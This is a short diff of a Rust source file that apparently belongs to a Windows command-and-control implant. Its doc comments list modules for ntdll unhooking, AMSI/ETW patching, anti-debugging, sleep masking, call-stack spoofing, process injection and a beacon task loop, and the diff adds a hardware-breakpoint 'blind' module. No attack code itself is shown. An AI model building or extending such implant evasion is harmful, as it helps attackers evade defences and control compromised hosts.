@@ -26,9 +26,9 @@
 //! - [`unhook`] — KnownDlls `\ntdll` fresh-map (+ disk fallback) unhook.
 //! - [`blind`] — AMSI/ETW userland byte-patch (idempotent; AMSI retried/cycle).
 //! - [`antidebug`] — BeingDebugged / ProcessDebugPort / uptime checks.
-//! - [`kits`] — CS-style kit seams: `SleepmaskKit`/`ProcessInjectKit` (no-op
-//!   defaults; real impls are P2). [`stack`]/[`sleep`]/[`mem`] are the matching
-//!   skeletons (call-stack spoof / sleep mask — not yet wired).
+//! - [`kits`] — CS-style kit seams: `SleepmaskKit`/`ProcessInjectKit` (real
+//!   P2 impls via `evasion_glue`). [`stack`]/[`sleep`]/[`mem`] are the matching
+//!   live modules (call-stack spoof / sleep mask / memory encryption).
 //! - [`config`] — per-build encrypted config (`nyx_config_macros::embed!`).
 //! - [`beacon`] — the task loop (check-in → POST → receive → execute); every
 //!   wire `Command`. [`envelopes`] bakes the malleable-C2 shapes it sends.
@@ -63,6 +63,8 @@ pub mod antidebug;
 pub mod beacon;
 #[cfg(target_os = "windows")]
 pub mod blind;
+#[cfg(target_os = "windows")]
+pub mod blind_hwbp;
 #[cfg(target_os = "windows")]
 pub mod bof;
 #[cfg(target_os = "windows")]
